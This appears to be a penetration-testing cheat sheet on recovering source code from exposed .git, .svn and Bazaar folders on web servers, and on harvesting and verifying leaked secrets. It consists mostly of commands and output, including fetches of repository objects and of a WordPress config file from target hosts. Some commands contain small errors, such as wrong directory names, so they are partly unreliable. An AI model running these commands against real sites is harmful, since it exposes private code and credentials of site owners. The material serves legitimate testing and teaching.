# Insecure source code management

- [GIT - Source code management](#git---source-code-management)
  - [Github example with a .git](#github-example-with-a-git)
  - [Automatic way : diggit.py](#automatic-way--diggitpy)
  - [Automatic way : GoGitDumper](#automatic-way-gogitdumper)
  - [Automatic way : rip-git](#automatic-way--rip-git)
  - [Automatic way : GitHack](#automatic-way--githack)
  - [Harvesting secrets : trufflehog](#harvesting-secrets--trufflehog)
  - [Harvesting secrets : Gitrob](#harvesting-secrets--gitrob)
  - [Harvesting secrets : Gitleaks](#harvesting-secrets--gitleaks)
- [SVN - Source code management](#svn---source-code-management)
  - [SVN example (Wordpress)](#svn-example-wordpress)
  - [Automatic way : svn-extractor](#automatic-way--svn-extractor)
- [BAZAAR - Source code management](#bazaar---source-code-management)
  - [Automatic way : rip-bzr](#automatic-way--rip-bzr)
  - [Automatic way : bzr_dumper](#automatic-way--bzr_dumper)
- [Leaked API keys](#leaked-api-keys)

## GIT - Source code management

The following examples will create either a copy of the .git or a copy of the current commit.

Check for the following files, if they exist you can extract the .git folder.

- .git/config
- .git/HEAD
- .git/logs/HEAD

### Github example with a .git

1. Check 403 error (Forbidden) for .git or even better : a directory listing
2. Git saves all informations in log file .git/logs/HEAD (try 'head' in lowercase too)
    ```powershell
    0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
    15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
    26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
    6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
    ```
3. Access to the commit based on the hash -> a directory name (first two signs from hash) and filename (rest of it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,
    ```powershell
    # create a .git directory
    git init test
    cd test/.git

    # download the file
    wget http://xxx.web.xxx.com/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
    mkdir .git/object/26
    mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/

    # display the content of the file
    git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
        tree 323240a3983045cdc0dec2e88c1358e7998f2e39
        parent 15ca375e54f056a576905b41a417b413c57df6eb
        author Michael <michael@easyctf.com> 1489390329 +0000
        committer Michael <michael@easyctf.com> 1489390329 +0000
        Initial.
    ```
4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
    ```powershell
    wget http://xxx.web.xxx.com/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
    mkdir .git/object/32
    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/

    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
    ```
5. Read the data (flag.txt)
    ```powershell
    wget http://xxx.web.xxx.com/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
    mkdir .git/object/cb
    mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
    git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
    ```

### Recovering the content of .git/index

Use the git index file parser, using python3 https://pypi.python.org/pypi/gin

```powershell
pip3 install gin
gin ~/git-repo/.git/index
```

Recover name and sha1 hash for each files listed in the index, allowing us to re-use the previous method on the file.

```powershell
$ gin .git/index | egrep -e "name|sha1" 
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98

name = CRLF injection/README.md
sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
```
 


### Automatic way : diggit.py

```powershell
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://webpage.com -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1

-u is remote path, where .git folder exists
-t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init)
-o is a hash of particular Git object to download
```

### Automatic way : GoGitDumper

```powershell
go get github.com/c-sto/gogitdumper
gogitdumper -u http://urlhere.com/.git/ -o yourdecideddir/.git/
git log
git checkout
```

### Automatic way : rip-git

```powershell
perl rip-git.pl -v -u "http://edge1.web.*****.com/.git/"

git cat-file -p 07603070376d63d911f608120eb4b5489b507692  
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
parent 15ca375e54f056a576905b41a417b413c57df6eb
author Michael <michael@easyctf.com> 1489389105 +0000
committer Michael <michael@easyctf.com> 1489389105 +0000

git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

### Automatic way : GitHack

```powershell
git clone https://github.com/lijiejie/GitHack
GitHack.py http://www.openssl.org/.git/
```

### Harvesting secrets : trufflehog

> Searches through git repositories for high entropy strings and secrets, digging deep into commit history

```powershell
pip install truffleHog # https://github.com/dxa4481/truffleHog
truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
```

### Harvesting secrets : Gitrob

> Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.

```powershell
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob [options] target [target2] ... [targetN]
```

### Harvesting secrets - Gitleaks

> Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.

```powershell
# Run gitleaks against a public repository
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r  https://github.com/zricethezav/gitleaks.git

# Run gitleaks against a local repository already cloned into /tmp/
docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks

# Run gitleaks against a specific Github Pull request
docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000

or

go get -u github.com/zricethezav/gitleaks
```

## SVN - Source code management

### SVN example (Wordpress)

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
    ```powershell
    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
    ```
2. Download interesting files
    * remove \$sha1\$ prefix
    * add .svn-base postfix
    * use first two signs from hash as folder name inside pristine/ directory (94 in this case)
    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

### Automatic way : svn-extractor

```powershell
git clone https://github.com/anantshri/svn-extractor.git
python svn-extractor.py –url "url with .svn available"
```

## BAZAAR - Source code management

### Automatic way : rip-bzr.pl

```powershell
wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u  
```

### Automatic way : bzr_dumper

```powershell
git clone https://github.com/SeahunOh/bzr_dumper
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)                                                                                                                                                       
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish

$ bzr revert
 N  application.py
 N  database.py
 N  static/   
```

## Leaked API keys

If you find any key , use the [keyhacks](https://github.com/streaak/keyhacks) from @streaak to verifiy them.

Twilio example :

```powershell
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Keys.json' -u ACCOUNT_SID:AUTH_TOKEN
```

## References

- [bl4de, hidden_directories_leaks](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
- [bl4de, diggit](https://github.com/bl4de/security-tools/tree/master/diggit)
- [Gitrob: Now in Go - Michael Henriksen](https://michenriksen.com/blog/gitrob-now-in-go/)